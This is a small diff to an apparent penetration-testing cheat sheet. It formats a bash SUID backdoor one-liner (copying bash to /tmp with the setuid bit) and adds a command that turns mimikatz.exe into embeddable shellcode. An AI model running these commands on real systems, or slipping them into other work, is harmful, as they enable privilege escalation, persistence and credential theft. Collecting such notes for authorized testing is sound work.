@@ -106,6 +106,17 @@ python2 /opt/Windows-Exploit-Suggester/windows-exploit-suggester.py --update
 
 
 
-bash SUID
+## bash SUID
 
+```bash
 cp /bin/bash /tmp/bash && chmod u+s /tmp/bash
+```
+
+## exe2Shellcode
+
+```bash
+xxd -i mimikatz.exe > shellcode.h
+```
+
+
+
